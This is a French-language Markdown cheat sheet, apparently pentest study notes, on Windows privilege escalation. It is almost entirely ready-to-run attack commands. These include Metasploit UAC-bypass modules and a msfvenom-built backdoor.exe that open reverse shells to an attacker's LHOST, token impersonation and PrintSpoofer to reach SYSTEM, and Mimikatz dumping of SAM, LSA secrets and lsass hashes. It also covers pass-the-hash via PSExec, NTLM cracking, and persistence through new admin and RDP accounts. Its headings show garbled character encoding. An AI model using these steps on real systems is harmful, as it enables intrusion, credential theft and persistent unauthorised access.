# üè¥‚Äç‚ò†Ô∏è √âl√©vation de Privil√®ges Windows

[‚Üê Retour √† la table des mati√®res](../README.md)

## √ânum√©ration Initiale

### Commandes de base pour l'√©num√©ration
```cmd
# √ânum√©rer les utilisateurs et groupes
net user
net localgroup administrators

# Rechercher des fichiers de flag Windows
dir C:\Windows\System32\*.txt /s /b

# V√©rifier les privil√®ges dans Meterpreter
getprivs
```

## Kernel Exploits

### Local Exploit Suggester
```bash
# Dans un meterpreter actif
use post/multi/recon/local_exploit_suggester
set SESSION session_id
run
```

## Bypass UAC 

### UAC Bypass avec injection en m√©moire
```bash
# Conditions : acc√®s x64 meterpreter/shell requis
# Changer le payload en x64 pour l'injection en m√©moire
use exploit/windows/local/bypassuac_injection
set SESSION session_id
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT 4445
run
```

### G√©n√©ration du payload malveillant ‚Üí [üìñ Guide MSFVenom](../06-tools/msfvenom.md)
```bash
# G√©n√©ration avec msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe > backdoor.exe
```

### Upload et ex√©cution
```bash
# Dans le meterpreter
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .

# D√©marrer un handler dans un autre msfconsole
use exploit/multi/handler
```

## Impersonation de Tokens

### V√©rification des privil√®ges
```bash
# Dans Meterpreter, v√©rifier les privil√®ges
getprivs

# Rechercher "SeImpersonatePrivilege" 
# Si pr√©sent, possibilit√© de getsystem
getsystem
```

### Module Incognito
```bash
# Charger le module incognito dans Meterpreter
load incognito

# Lister les tokens disponibles
list_tokens -u

# Impersonifier un token sp√©cifique
impersonate_token "DOMAIN\\USERNAME"

# Migrer vers un processus apr√®s impersonation
migrate PID
```

## PrintSpoofer (√âl√©vation locale)
```bash
# Utiliser PrintSpoofer64.exe pour obtenir SYSTEM
# Upload de l'utilitaire sur la cible
upload /path/to/PrintSpoofer64.exe

# Ex√©cution pour √©l√©vation
shell
PrintSpoofer64.exe -i -c cmd
```

## Dumping de Hash avec Mimikatz

### Module Kiwi (Mimikatz int√©gr√©)
```bash
# Dans Meterpreter, charger kiwi
load kiwi

# R√©cup√©rer les hash NTLM
creds_all

# Dumper les hash SAM
lsa_dump_sam

# Dumper les secrets LSA
lsa_dump_secrets
```

### Dumping manuel avec hashdump
```bash
# Migration vers le processus lsass
migrate -N lsass.exe

# Dump des hash
hashdump
```

## Authentification avec Hash NTLM

### PSExec avec hash NTLM
```bash
# Module PSExec dans Metasploit
use exploit/windows/smb/psexec
set RHOSTS target_ip
set SMBUser username
set SMBPass ntlm_hash_here
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your_ip
run
```

### Impacket PSExec
```bash
# Utilisation d'Impacket en ligne de commande
python3 /usr/share/doc/python3-impacket/examples/psexec.py Username@ip
# Ou avec hash NTLM
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes :ntlm_hash Username@ip
```

## Cracking de Hash NTLM

### Avec Metasploit
```bash
# Module de cracking int√©gr√©
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
# Ajouter les hash r√©cup√©r√©s
run
```

### Avec Hashcat
```bash
# Cracker des hash NTLM (mode 1000)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Afficher les r√©sultats
hashcat -m 1000 hashes.txt --show
```

## Persistance

### Acc√®s RDP persistant
```bash
# Dans Meterpreter, cr√©er un utilisateur RDP
run getgui -e -u alice -p hack_123321

# V√©rifier que RDP est activ√©
run getgui -e
```

### Cr√©ation d'utilisateur administrateur
```cmd
# Cr√©er un nouvel utilisateur
net user hacker password123 /add

# Ajouter aux administrateurs
net localgroup administrators hacker /add

# Activer RDP si n√©cessaire
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

## Upgrade de Session

### Shell vers Meterpreter
```bash
# Dans Metasploit, upgrade une session shell vers meterpreter
sessions -u session_id
```

## Ressources Utiles

- [LOLBAS](https://lolbas-project.github.io/) - Living Off The Land Binaries
- [GTFOBins](https://gtfobins.github.io/) - Unix Binaries
- [Reverse Shells](https://revshells.com/) - G√©n√©rateur de reverse shells
